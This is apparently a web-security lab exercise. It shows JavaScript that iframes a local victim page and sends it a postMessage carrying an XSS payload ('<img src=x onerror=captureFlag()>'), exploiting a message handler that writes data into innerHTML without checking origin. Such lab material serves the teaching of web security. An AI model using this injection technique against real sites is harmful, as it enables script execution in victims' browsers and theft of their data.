Lab 11 — postMessage XSS Exploit

This page iframes the victim and sends a malicious postMessage. The victim's message handler passes event.data directly to innerHTML without checking origin.

// Exploit: iframe victim, then postMessage payload
const iframe = document.createElement('iframe');
iframe.src = 'http://localhost:3000/lab11';
document.body.appendChild(iframe);
iframe.onload = () => {
  iframe.contentWindow.postMessage(
    '<img src=x onerror=captureFlag()>',
    '*'   // no origin restriction
  );
};
